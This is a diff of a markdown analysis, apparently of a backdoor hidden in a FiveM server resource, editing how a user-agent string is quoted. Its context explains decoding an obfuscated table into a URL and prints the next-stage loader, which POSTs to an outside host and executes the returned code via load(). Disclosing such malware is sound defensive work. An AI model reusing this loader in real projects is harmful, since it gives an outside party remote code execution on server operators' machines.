@@ -45,7 +45,7 @@ In-short the `random_char` table is a link, which gets interpreted by `str_utf8(
 Running the code without the last codeblock (which if you look at the `Enchanced_Tabs` table is an http request) in any lua compiler (https://onecompiler.com/lua/42d7ex7dx)
 and appending `print(str_utf8)` to it, so we can see what the encoded message is, gives us this link - https://fivem.kvac.cz/f.php?key=ojoTJZWePRnPKYUpA6z4.
 
-If we cURL the link using the "FXServer/PerformHttpRequest" user-agent, we'd get this:
+If we cURL the link using the `FXServer/PerformHttpRequest` user-agent, we'd get this:
 ```
 PerformHttpRequest("https://fivem.kvac.cz/_/api.php\x3f\x6b\x65\x79\x3d\x33\x52\x6a\x34\x6c\x5a\x65\x79\x76\x57\x4a\x6e\x61\x33\x50\x69\x7a\x71\x4f\x6b", function(a, b) if b == nil or b == "" then return end assert(load(b))() end, "POST")
 ```
